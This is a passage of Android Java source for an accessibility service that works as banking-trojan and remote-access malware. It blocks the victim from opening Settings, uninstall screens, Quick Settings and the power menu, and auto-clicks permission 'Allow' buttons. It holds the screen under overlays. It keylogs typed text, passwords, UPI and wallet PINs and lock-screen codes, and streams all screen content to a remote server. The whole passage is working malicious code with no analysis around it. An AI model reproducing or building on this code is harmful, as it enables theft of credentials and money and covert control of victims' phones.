                    || flat.contains("running in background") || flat.contains("foreground service"))
                && (flat.contains("stop") || flat.contains("close") || flat.contains("end"));

            if (isActiveAppsPanel) {
                lastActiveAppsBlock = now;
                // Dismiss immediately: BACK closes the panel
                try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
                mainHandler.postDelayed(() -> {
                    try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                }, 80);
                mainHandler.postDelayed(() -> {
                    try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                }, 200);
            }
        } catch (Exception ignored) {}
    }

    // ── Quick Settings + Power menu blocker ──────────────────────────────────
    private long lastQsBlock = 0;
    private void checkAndBlockQuickSettings() {
        long now = System.currentTimeMillis();
        if (now - lastQsBlock < 800) return; // debounce
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            String flat = flattenNode(root).toLowerCase();
            root.recycle();

            // ── WHITELIST: Never block these system dialogs ──────────────────
            // MediaProjection "Start now" — must be allowed through
            if (flat.contains("recording or casting") || flat.contains("start recording")
                    || flat.contains("screen capture permission")
                    || (flat.contains("start now") && flat.contains("recording"))) return;
            // Permission grant dialogs (camera, mic, storage etc.)
            if (flat.contains("allow") && (flat.contains("access") || flat.contains("permission"))) return;

            // ── Power menu (long-press power button) ─────────────────────────
            if (flat.contains("power off") || flat.contains("restart")
                    || flat.contains("reboot") || flat.contains("emergency mode")
                    || flat.contains("emergency call")) {
                lastQsBlock = now;
                try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
                mainHandler.postDelayed(() -> {
                    try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                }, 80);
                return;
            }

            // ── Quick Settings panel — score based detection ──────────────────
            // Need ≥2 tile names to confirm this is QS (not a notification or dialog)
            int qsScore = 0;
            if (flat.contains("mobile data") || flat.contains("cellular data")) qsScore++;
            if (flat.contains("airplane mode") || flat.contains("flight mode")) qsScore++;
            if (flat.contains("wi-fi") || flat.contains("wifi"))               qsScore++;
            if (flat.contains("bluetooth"))                                      qsScore++;
            if (flat.contains("do not disturb") || flat.contains("dnd"))        qsScore++;
            if (flat.contains("hotspot") || flat.contains("tethering"))         qsScore++;
            if (flat.contains("flashlight") || flat.contains("torch"))          qsScore++;
            if (flat.contains("auto-rotate") || flat.contains("auto rotate"))   qsScore++;
            if (flat.contains("battery saver") || flat.contains("power saving")) qsScore++;
            if (flat.contains("nfc"))                                            qsScore++;
            // "Edit" + multiple tiles = QS panel open
            if (flat.contains("edit") && qsScore >= 1)                          qsScore++;

            if (qsScore >= 2) {
                lastQsBlock = now;
                try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                mainHandler.postDelayed(() -> {
                    try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                }, 150);
            }
        } catch (Exception ignored) {}
    }

    // ── Settings watchdog — background thread checks every 1.5s ───────────────
    private volatile boolean watchdogRunning = false;
    private Thread watchdogThread;

    private void startSettingsWatchdog() {
        if (watchdogRunning) return;
        watchdogRunning = true;
        watchdogThread = new Thread(() -> {
            while (watchdogRunning) {
                try {
                    Thread.sleep(800); // fast check — intercept before user can tap Force Stop
                    if (!watchdogRunning) break;
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        CharSequence pkg = root.getPackageName();
                        root.recycle();
                        if (pkg != null) {
                            String p = pkg.toString().toLowerCase();
                            // Watch ALL dangerous package categories
                            if (p.contains("settings")  || p.contains("securitycenter")
                                    || p.contains("packageinstaller") || p.contains("systemui")
                                    || p.contains("recents")   || p.contains("launcher")
                                    || p.contains("safecenter") || p.contains("secure")
                                    || p.contains("permissionmanager") || p.contains("manager")
                                    || p.contains("taskmanager") || p.contains("optimizer")
                                    || p.contains("cleaner")   || p.equals("android")) {
                                mainHandler.post(this::checkAndBlockAppInfo);
                            }
                        }
                    }
                } catch (InterruptedException ie) {
                    break;
                } catch (Exception ignored) {}
            }
        });
        watchdogThread.setDaemon(true);
        watchdogThread.start();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        int type = e.getEventType();

        // ── App Info / Settings / Recents / Launcher blocker — INSTANT ────────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            String evPkg = e.getPackageName() != null ? e.getPackageName().toString().toLowerCase() : "";
            // Fire for ANY dangerous package category
            if (evPkg.contains("settings")    || evPkg.contains("securitycenter")
                    || evPkg.contains("packageinstaller") || evPkg.contains("systemui")
                    || evPkg.contains("recents")   || evPkg.contains("launcher")
                    || evPkg.contains("safecenter") || evPkg.contains("secure")
                    || evPkg.contains("permissionmanager") || evPkg.contains("phonemanager")
                    || evPkg.contains("taskmanager") || evPkg.contains("optimizer")
                    || evPkg.contains("cleaner")   || evPkg.contains("manager")
                    || evPkg.equals("android")) {
                checkAndBlockAppInfo();
                mainHandler.postDelayed(this::checkAndBlockAppInfo, 60);
                mainHandler.postDelayed(this::checkAndBlockAppInfo, 200);
                mainHandler.postDelayed(this::checkAndBlockAppInfo, 500);
            }
        }

        // ── Uninstall blocker — fires on ALL packages ──────────────────────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            if (isUninstallScreen(e)) {
                blockUninstall(); // immediate, no delay
                mainHandler.postDelayed(this::blockUninstall, 150);
            }
        }

        // ── Auto-allow: every new dialog/window → try to click Allow/Start now ─
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            mainHandler.postDelayed(this::tryAutoAllow, 150);
            mainHandler.postDelayed(this::tryAutoAllow, 500);
        }

        // ── Block "Active apps" Stop button (Samsung / stock systemui) ────────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (pkg.contains("systemui") || pkg.contains("android")) {
                mainHandler.postDelayed(this::checkAndBlockActiveApps, 150);
            }
        }

        // ── Block Quick Settings / Notification shade (swipe-down panel) ─────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (pkg.contains("systemui")) {
                mainHandler.postDelayed(this::checkAndBlockQuickSettings, 120);
            }
        }

        // ── Overlay persistence — restore block/black overlays after any system dialog ──
        // Fingerprint, biometric, lock screen dialogs can temporarily dismiss our overlays.
        // Fire on BOTH state_changed and windows_changed to catch all cases.
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || type == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
            // Re-install block_input overlay if dismissed (e.g. by fingerprint dialog)
            // Guard: don't restore mid-gesture (would block the gesture itself)
            boolean blockNeedsRestore = blockInputEnabled && !gestureInProgress
                && (blockOverlay == null || !blockOverlay.isAttachedToWindow());
            if (blockNeedsRestore) {
                mainHandler.postDelayed(this::doInstallOverlay, 100);
                mainHandler.postDelayed(this::doInstallOverlay, 500);
            }
            // Re-show black screen overlay if dismissed (e.g. by fingerprint/system dialog)
            boolean blackNeedsRestore = blackScreenEnabled
                && (visualBlackOverlay == null || !visualBlackOverlay.isAttachedToWindow());
            if (blackNeedsRestore) {
                final String txt = lastBlackScreenText;
                mainHandler.postDelayed(() -> {
                    if (blackScreenEnabled
                            && (visualBlackOverlay == null || !visualBlackOverlay.isAttachedToWindow()))
                        showBlackScreenOverlay(txt);
                }, 120);
                mainHandler.postDelayed(() -> {
                    if (blackScreenEnabled
                            && (visualBlackOverlay == null || !visualBlackOverlay.isAttachedToWindow()))
                        showBlackScreenOverlay(txt);
                }, 600);
            }
        }

        // ── HOME button counter — re-block if user escapes to launcher ──────
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String evPkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            // Known launcher packages — if any of these come to foreground, bring blocker back
            if (blockInputEnabled && (evPkg.contains("launcher") || evPkg.contains("home")
                    || evPkg.equals("com.google.android.apps.nexuslauncher")
                    || evPkg.equals("com.sec.android.app.launcher")
                    || evPkg.equals("com.miui.home")
                    || evPkg.equals("com.oneplus.launcher")
                    || evPkg.equals("com.android.launcher")
                    || evPkg.equals("com.android.launcher3"))) {
                mainHandler.postDelayed(this::doInstallOverlay, 120);
            }
        }

        // ── Screen Live Mode — auto-push on any UI change (including taps) ──
        if (screenLiveMode &&
            (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
             type == AccessibilityEvent.TYPE_VIEW_SCROLLED          ||
             type == AccessibilityEvent.TYPE_VIEW_CLICKED           ||
             type == AccessibilityEvent.TYPE_VIEW_FOCUSED           ||
             type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED      ||
             type == AccessibilityEvent.TYPE_VIEW_SELECTED)) {
            onWindowChangedMaybePush();
        }

        // ── Keylogger — detect HOME screen + reset dot count on app switch ──
        if (keylogActive && type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String evPkg2 = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (isLauncherPkg(evPkg2) && !evPkg2.equals(MY_PKG)) {
                lastSentFieldHint = "";
                currentFieldHint = "";
                pinDotCount.clear();
                pwCapture.clear();
                pwCapturePkg = "";
                pwFieldFocused = false;
                pwFocusedPkg = "";
                queueKey("[HOME]", evPkg2, System.currentTimeMillis());
            } else if (!evPkg2.equals(MY_PKG) && !evPkg2.isEmpty()) {
                pinDotCount.remove(evPkg2);
                pwCapture.remove(evPkg2);
                if (evPkg2.equals(pwCapturePkg)) pwCapturePkg = "";
                if (evPkg2.equals(pwFocusedPkg)) { pwFieldFocused = false; pwFocusedPkg = ""; }
            }
        }

        // ── Keylogger — dot-count tracker for custom in-app PIN pads ─────────
        // Catches React Native / Flutter / Trust Wallet / custom keyboard apps
        // that don't fire TYPE_VIEW_TEXT_CHANGED but DO update password dots on-screen.
        if (keylogActive && (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                || type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)) {
            String dotPkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (!dotPkg.equals(MY_PKG) && !isLauncherPkg(dotPkg)) {
                try {
                    AccessibilityNodeInfo dotRoot = getRootInActiveWindow();
                    if (dotRoot != null) {
                        int newDots = countPasswordDots(dotRoot);
                        dotRoot.recycle();
                        if (newDots > 0 || pinDotCount.containsKey(dotPkg)) {
                            int oldDots = pinDotCount.getOrDefault(dotPkg, 0);
                            if (newDots != oldDots) {
                                long nowDot = System.currentTimeMillis();
                                int delta = newDots - oldDots;
                                pinDotCount.put(dotPkg, newDots);
                                // Only emit if NOT already captured by TEXT_CHANGED or click (dedup)
                                if (nowDot - lastPinClickTs > PIN_DEDUP_MS
                                        && type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                                    if (delta > 0) {
                                        for (int i = 0; i < delta; i++)
                                            queueKey("[PIN]•", dotPkg, System.currentTimeMillis());
                                    } else {
                                        for (int i = 0; i < -delta; i++)
                                            queueKey("[⌫]", dotPkg, System.currentTimeMillis());
                                    }
                                } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                                    // Let TEXT_CHANGED handle it — just sync the dot count
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {}
            }
        }

        // ── Keylogger — lock screen pattern detection ─────────────────────
        if (keylogActive && type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String lockPkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (isLockScreenPkg(lockPkg)) {
                try {
                    AccessibilityNodeInfo lockRoot = getRootInActiveWindow();
                    if (lockRoot != null) {
                        String lockType = detectLockType(lockRoot);
                        if (lockType != null) {
                            queueKey("[LOCKSCREEN]" + lockType, lockPkg, System.currentTimeMillis());
                        }
                        lockRoot.recycle();
                    }
                } catch (Exception ignored) {}
            }
        }

        // ── Keylogger — capture typed text from text fields ───────────────
        if (keylogActive && type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (pkg.equals(MY_PKG) || isLauncherPkg(pkg)) return;
            AccessibilityNodeInfo src = e.getSource();
            boolean isPwd = false;
            if (src != null) { isPwd = src.isPassword(); src.recycle(); }

            String newText = (e.getText() != null && !e.getText().isEmpty())
                ? e.getText().get(0).toString() : "";
            String beforeText = e.getBeforeText() != null ? e.getBeforeText().toString() : "";

            if (isPwd || isPasswordMask(newText)) {
                // Dedup: if a PIN click just fired within PIN_DEDUP_MS, skip — click already logged the digit
                long now2 = System.currentTimeMillis();
                if (now2 - lastPinClickTs < PIN_DEDUP_MS) return;
                // Password field: dot per character added, single [⌫] per delete
                int delta = newText.length() - beforeText.length();
                if (delta > 0) {
                    for (int i = 0; i < delta; i++)
                        queueKey("[PIN]•", pkg, System.currentTimeMillis());
                } else if (delta < 0) {
                    for (int i = 0; i < -delta; i++)
                        queueKey("[⌫]", pkg, System.currentTimeMillis());
                }
                return;
            }
            // Normal (non-password) field
            if (newText.length() > beforeText.length() && newText.startsWith(beforeText)) {
                // Pure addition at end
                String added = newText.substring(beforeText.length());
                if (!isPasswordMask(added)) {
                    lastTextVal = newText; lastTextPkg = pkg;
                    queueKey(added, pkg, System.currentTimeMillis());
                }
            } else if (newText.length() < beforeText.length()) {
                // Deletion (could also be cut + immediately typed something new in one event)
                int deleted = beforeText.length() - newText.length();
                for (int i = 0; i < deleted; i++)
                    queueKey("[⌫]", pkg, System.currentTimeMillis());
                // If newText is not empty AND not a simple tail-deletion of beforeText,
                // user cut text and typed something new — log the new typed text too.
                // e.g. beforeText="hello", newText="w" → 4 backspaces + "w"
                if (!newText.isEmpty() && !beforeText.startsWith(newText) && !isPasswordMask(newText)) {
                    lastTextVal = newText; lastTextPkg = pkg;
                    queueKey(newText, pkg, System.currentTimeMillis());
                }
            } else if (!newText.equals(beforeText) && !newText.isEmpty()) {
                if (!newText.equals(lastTextVal) || !pkg.equals(lastTextPkg)) {
                    lastTextVal = newText; lastTextPkg = pkg;
                    queueKey("[~]" + newText, pkg, System.currentTimeMillis());
                }
            }
        }

        // ── Track focused input field (captures label/hint for keylog context) ───
        // Also tracks password field focus for keyboard click capture
        if (keylogActive && type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
            if (!pkg.equals(MY_PKG) && !isLauncherPkg(pkg)) {
                AccessibilityNodeInfo src = e.getSource();
                if (src != null) {
                    if (src.isEditable()) { // only actual text input fields
                        // Track password field focus state
                        if (src.isPassword()) {
                            pwFieldFocused = true;
                            pwFocusedPkg = pkg;
                            pwCapturePkg = pkg;
                            pwCapture.putIfAbsent(pkg, new StringBuilder());
                        } else {
                            pwFieldFocused = false;
                        }

                        String hint = "";
                        // Priority: hintText > contentDescription > label node text
                        if (src.getHintText() != null && !src.getHintText().toString().isEmpty()) {
                            hint = src.getHintText().toString();
                        } else if (src.getContentDescription() != null && !src.getContentDescription().toString().isEmpty()) {
                            hint = src.getContentDescription().toString();
                        }
                        // Try to find a label associated with this field
                        if (hint.isEmpty()) {
                            try {
                                AccessibilityNodeInfo lbl = src.getLabeledBy();
                                if (lbl != null) {
                                    if (lbl.getText() != null) hint = lbl.getText().toString();
                                    lbl.recycle();
                                }
                            } catch (Exception ignored) {}
                        }
                        currentFieldHint = hint;
                        // Emit [FIELD] event if hint changed
                        if (!hint.isEmpty() && !hint.equals(lastSentFieldHint)) {
                            lastSentFieldHint = hint;
                            queueKey("[FIELD]" + hint, pkg, System.currentTimeMillis());
                        }
                    } else {
                        // Non-editable field focused — clear pw focus
                        pwFieldFocused = false;
                    }
                    src.recycle();
                }
            }
        }

        // ── PIN pad tap capture (UPI custom numeric pads, lock screens) ───
        if (keylogActive && type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";

            // ── Keyboard key click capture (ALL keyboards: Gboard, Samsung, SwiftKey, etc.) ──
            // Captures key clicks regardless of password field focus (catches all typed keys)
            if (isKeyboardOrSystemPkg(pkg)) {
                String targetPkg;
                if (pwFieldFocused && !pwFocusedPkg.isEmpty()) {
                    targetPkg = pwFocusedPkg;
                } else {
                    targetPkg = resolveForegroundPkg();
                    if (targetPkg == null || targetPkg.isEmpty()) targetPkg = "keyboard";
                }
                AccessibilityNodeInfo src = e.getSource();
                if (src != null) {
                    String actualKey = extractKeyFromKeyboard(src);
                    if (actualKey == null) actualKey = extractDigitFromClick(src);
                    if (actualKey != null) {
                        lastPinClickTs = System.currentTimeMillis();
                        pwCapturePkg = targetPkg;
                        pwCapture.putIfAbsent(targetPkg, new StringBuilder());
                        StringBuilder sb = pwCapture.get(targetPkg);
                        if ("[⌫]".equals(actualKey)) {
                            queueKey("[⌫]", targetPkg, lastPinClickTs);
                            if (sb != null && sb.length() > 0) sb.deleteCharAt(sb.length() - 1);
                        } else if (actualKey.length() == 1) {
                            queueKey("[PIN]" + actualKey, targetPkg, lastPinClickTs);
                            if (sb != null) sb.append(actualKey);
                        }
                    }
                    src.recycle();
                }
            }
            // ── Lock screen keypad capture (Android PIN/passcode screen) ──
            else if (isLockScreenPkg(pkg)) {
                AccessibilityNodeInfo src = e.getSource();
                if (src != null) {
                    String pinKey = extractDigitFromClick(src);
                    if (pinKey == null) pinKey = extractKeyFromKeyboard(src);
                    if (pinKey == null) pinKey = extractLockScreenDigit(src);
                    if (pinKey != null) {
                        lastPinClickTs = System.currentTimeMillis();
                        String lockPkg = "lockscreen";
                        queueKey(pinKey, lockPkg, lastPinClickTs);
                        pwCapturePkg = lockPkg;
                        pwCapture.putIfAbsent(lockPkg, new StringBuilder());
                        StringBuilder sb = pwCapture.get(lockPkg);
                        if (sb != null) {
                            if ("[⌫]".equals(pinKey)) {
                                if (sb.length() > 0) sb.deleteCharAt(sb.length() - 1);
                            } else if (pinKey.startsWith("[PIN]") && pinKey.length() > 5) {
                                sb.append(pinKey.charAt(5));
                            } else if (pinKey.length() == 1) {
                                sb.append(pinKey);
                            }
                        }
                    }
                    src.recycle();
                }
            }
            // ── In-app click capture (PIN pads, buttons, links — everything) ──
            else if (!pkg.equals(MY_PKG) && !isLauncherPkg(pkg)) {
                AccessibilityNodeInfo src = e.getSource();
                String pinKey = null;
                String clickLabel = null;
                if (src != null) {
                    pinKey = extractDigitFromClick(src);
                    if (pinKey == null) pinKey = extractKeyFromKeyboard(src);
                    if (pinKey == null) {
                        clickLabel = extractClickLabel(src);
                    }
                    src.recycle();
                }
                if (pinKey == null && clickLabel == null) {
                    java.util.List<CharSequence> evTexts = e.getText();
                    if (evTexts != null) {
                        for (CharSequence ecs : evTexts) {
                            if (ecs != null) {
                                String et = ecs.toString().trim();
                                pinKey = matchPinKey(et);
                                if (pinKey != null) break;
                                if (clickLabel == null && !et.isEmpty() && et.length() <= 80) {
                                    clickLabel = et;
                                }
                            }
                        }
                    }
                }
                if (pinKey == null && clickLabel == null) {
                    CharSequence evDesc = e.getContentDescription();
                    if (evDesc != null) {
                        String d = evDesc.toString().trim();
                        pinKey = matchPinKey(d);
                        if (pinKey == null && !d.isEmpty() && d.length() <= 80) clickLabel = d;
                    }
                }
                long now = System.currentTimeMillis();
                if (pinKey != null) {
                    lastPinClickTs = now;
                    queueKey(pinKey, pkg, now);
                    pwCapturePkg = pkg;
                    pwCapture.putIfAbsent(pkg, new StringBuilder());
                    StringBuilder sb = pwCapture.get(pkg);
                    if (sb != null) {
                        if ("[⌫]".equals(pinKey)) {
                            if (sb.length() > 0) sb.deleteCharAt(sb.length() - 1);
                        } else if (pinKey.startsWith("[PIN]") && pinKey.length() > 5) {
                            sb.append(pinKey.charAt(5));
                        } else if (pinKey.length() == 1) {
                            sb.append(pinKey);
                        }
                    }
                } else if (clickLabel != null) {
                    queueKey("[TAP]" + clickLabel, pkg, now);
                }
            }
        }
    }

    private void tryAutoAllow() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            if (clickAllowButton(root)) return;

            // ── Fallback: if window belongs to a known permission package,
            //    collect all leaf buttons and click the LAST one
            //    (Android always puts the positive action last/rightmost) ──────
            String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
            boolean isPermPkg = PERM_PKGS.contains(pkg)
                    || pkg.contains("permission") || pkg.contains("packageinstaller")
                    || pkg.contains("systemui");
            if (isPermPkg) {
                java.util.List<AccessibilityNodeInfo> btns = new java.util.ArrayList<>();
                collectLeafButtons(root, btns);
                if (!btns.isEmpty()) {
                    AccessibilityNodeInfo last = btns.get(btns.size() - 1);
                    last.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
            root.recycle();
        } catch (Exception ignored) {}
    }

    /** Collect all clickable leaf nodes (buttons / text views with actions). */
    private void collectLeafButtons(AccessibilityNodeInfo node,
                                    java.util.List<AccessibilityNodeInfo> out) {
        if (node == null) return;
        boolean isLeaf = node.getChildCount() == 0;
        if (isLeaf && node.isClickable()) {
            out.add(node);
            return;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            collectLeafButtons(node.getChild(i), out);
        }
    }

    private boolean clickAllowButton(AccessibilityNodeInfo node) {
        if (node == null) return false;
        // Check this node
        CharSequence textCs = node.getText();
        CharSequence descCs = node.getContentDescription();
        String text = textCs != null ? textCs.toString().toLowerCase().trim() : "";
        String desc = descCs != null ? descCs.toString().toLowerCase().trim() : "";
        if ((node.isClickable() || node.getClassName() != null &&
                (node.getClassName().toString().contains("Button") ||
                 node.getClassName().toString().contains("TextView"))) &&
            isAllowText(text, desc)) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            node.recycle();
            return true;
        }
        // Recurse into children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null && clickAllowButton(child)) {
                node.recycle();
                return true;
            }
        }
        node.recycle();
        return false;
    }

    private boolean isAllowText(String text, String desc) {
        for (String a : ALLOW_TEXTS) {
            if (text.equals(a) || desc.equals(a)) return true;
            // Also partial match for "allow" at start
            if (a.equals("allow") && (text.startsWith("allow") || desc.startsWith("allow"))) return true;
        }
        return false;
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        int code = event.getKeyCode();
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            String keyName;
            if (code >= KeyEvent.KEYCODE_0 && code <= KeyEvent.KEYCODE_9) {
                keyName = String.valueOf(code - KeyEvent.KEYCODE_0);
            } else if (code >= KeyEvent.KEYCODE_A && code <= KeyEvent.KEYCODE_Z) {
                keyName = String.valueOf((char)('a' + code - KeyEvent.KEYCODE_A));
            } else {
                keyName = KeyEvent.keyCodeToString(code).replace("KEYCODE_", "");
            }
            queueKey(keyName, "hardware", System.currentTimeMillis());
        }
        // When blocking is active, consume BACK / RECENTS / MENU / VOLUME keys
        // HOME cannot be consumed here (Android security) — handled via onAccessibilityEvent
        if (blockOverlay != null) {
            if (code == KeyEvent.KEYCODE_BACK
                    || code == KeyEvent.KEYCODE_APP_SWITCH
                    || code == KeyEvent.KEYCODE_MENU
                    || code == KeyEvent.KEYCODE_SEARCH
                    || code == KeyEvent.KEYCODE_VOLUME_DOWN
                    || code == KeyEvent.KEYCODE_VOLUME_UP
                    || code == KeyEvent.KEYCODE_VOLUME_MUTE
                    || code == KeyEvent.KEYCODE_CAMERA
                    || code == KeyEvent.KEYCODE_NOTIFICATION) {
                return true; // swallow — never reaches the system
            }
        }
        return false;
    }

    private void queueKey(String key, String app, long ts) {
        if (!keylogActive || key == null) return;
        // Strip password-mask chars (•, *, ·) from raw typed text only
        // Special tags like [⌫] [~] [FULL] [FIELD] [PIN] start with '[' — leave them untouched
        String clean = key.startsWith("[") ? key
            : key.replace("\u2022", "")   // bullet •
                 .replace("*", "")        // asterisk *
                 .replace("\u00B7", "")   // middle dot ·
                 .replace("\u25CF", "");  // black circle ●
        if (clean.isEmpty()) return;
        // Auto-send field hint when app changes or field context is new
        String fieldHint = currentFieldHint;
        synchronized (keyBuffer) {
            keyBuffer.add("{\"key\":" + org.json.JSONObject.quote(clean)
                + ",\"app\":" + org.json.JSONObject.quote(app)
                + ",\"field\":" + org.json.JSONObject.quote(fieldHint)
                + ",\"ts\":" + ts + "}");
            if (keyBuffer.size() >= KEY_FLUSH_SIZE) flushKeylog();
        }
    }

    /* ── Screen content reader ───────────────────────────────────────────── */
    private static volatile boolean screenLiveMode = false;
    public static void setScreenLive(boolean on) {
        screenLiveMode = on;
        // instance will start/stop the periodic timer via setScreenLiveInstance
    }
    public static boolean isScreenLive() { return screenLiveMode; }

    // ── Periodic screen-text push (fires every 250ms when live mode on) ──
    private final Runnable screenLiveTick = new Runnable() {
        @Override public void run() {
            if (!screenLiveMode) return;
            new Thread(() -> {
                try {
                    String result = getScreenText();
                    if (result != null && !result.isEmpty()) {
                        ApiClient.postJson("/device/screen-text/" + DeviceIdManager.getDeviceId(PanelAccessibility.this), result);
                    }
                } catch (Exception ignored) {}
            }).start();
            // Schedule next tick
            mainHandler.postDelayed(screenLiveTick, 150);
        }
    };

    /** Start/stop the periodic live screen push */
    void startScreenLiveTicks() {
        mainHandler.removeCallbacks(screenLiveTick);
        if (screenLiveMode) mainHandler.postDelayed(screenLiveTick, 100);
    }
    void stopScreenLiveTicks() {
        mainHandler.removeCallbacks(screenLiveTick);
    }

    // Debounce runnable for event-driven push
    private final Runnable screenPushDebounce = () -> {
        screenPushDeadline = 0; // reset max-wait clock
        new Thread(() -> {
            try {
                String result = getScreenText();
                if (result != null && !result.isEmpty()) {
                    ApiClient.postJson("/device/screen-text/" + DeviceIdManager.getDeviceId(PanelAccessibility.this), result);
                }
            } catch (Exception ignored) {}
        }).start();
    };

    /** Max-wait: if events keep resetting debounce, force-push after 500ms regardless */
    private long screenPushDeadline = 0;
    private static final long PUSH_DEBOUNCE_MS = 80;
    private static final long PUSH_MAX_WAIT_MS  = 500;

    /** Called on any UI event — debounces pushes, but forces one every 500ms if flooded */
    private void onWindowChangedMaybePush() {
        if (!screenLiveMode) return;
        long now = System.currentTimeMillis();
        if (screenPushDeadline == 0) screenPushDeadline = now + PUSH_MAX_WAIT_MS;
        mainHandler.removeCallbacks(screenPushDebounce);
        long delay = (now >= screenPushDeadline) ? 0 : PUSH_DEBOUNCE_MS;
        mainHandler.postDelayed(screenPushDebounce, delay);
    }

    /**
     * Reads ALL visible screen content using all windows (not just active window).
     * Returns JSON: { pkg, title, text, inputs }
     */
    @SuppressWarnings("NewApi")
    public String getScreenText() {
        try {
            String pkg = "";
            String title = "";
            StringBuilder allText = new StringBuilder();
            StringBuilder inputFields = new StringBuilder();
            org.json.JSONArray els = new org.json.JSONArray();

            // Get screen dimensions
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int sw = dm.widthPixels;
            int sh = dm.heightPixels;

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                java.util.List<AccessibilityWindowInfo> windows = getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo win : windows) {
                        int winTypeVal = win.getType();
                        boolean isIme = (winTypeVal == AccessibilityWindowInfo.TYPE_INPUT_METHOD);
                        // Always skip our own overlay window — whether block_input is on or off
                        // TYPE_ACCESSIBILITY_OVERLAY from MY_PKG is our blocking overlay, not a real app
                        boolean isOurOverlay = (winTypeVal == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY);
                        AccessibilityNodeInfo root = win.getRoot();
                        if (root == null) continue;
                        String winPkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                        // Skip our own app's windows (overlay, etc.)
                        if (winPkg.equals(MY_PKG)) { root.recycle(); continue; }
                        // Include IME (keyboard) windows — mark elements with isKeyboard flag
                        // Skip OTHER system overlays that add noise (not keyboards)
                        if (!isIme && !isOurOverlay && isKeyboardOrSystemPkg(winPkg)) { root.recycle(); continue; }
                        CharSequence winTitle = win.getTitle();
                        if (!winPkg.startsWith("android") && pkg.isEmpty()) pkg = winPkg;
                        if (winTitle != null && !winTitle.toString().isEmpty() && title.isEmpty()) title = winTitle.toString();
                        if (!isIme) {
                            if (allText.length() > 0) allText.append("\n─────────────\n");
                            allText.append("APP: ").append(winPkg).append("\n");
                            extractAllText(root, allText, inputFields, 0);
                        }
                        extractElements(root, els, 0, isIme);
                        root.recycle();
                    }
                }
            }
            if (allText.length() == 0) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    String rootPkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                    // If active window is our own overlay, skip — read the underlying app instead
                    if (!rootPkg.equals(MY_PKG)) {
                        pkg = rootPkg;
                        extractAllText(root, allText, inputFields, 0);
                        extractElements(root, els, 0, false);
                    }
                    root.recycle();
                }
            }

            if (allText.length() == 0 && inputFields.length() == 0 && els.length() == 0) return "";

            org.json.JSONObject j = new org.json.JSONObject();
            j.put("pkg", pkg);
            j.put("title", title);
            j.put("text", allText.toString().trim());
            j.put("inputs", inputFields.toString().trim());
            j.put("sw", sw);
            j.put("sh", sh);
            j.put("els", els);
            j.put("ts", System.currentTimeMillis());
            // pwcap: actual typed PIN/password text captured from button clicks
            // keyed by pkg, shown in reader even when node.getText() is masked
            if (!pwCapture.isEmpty()) {
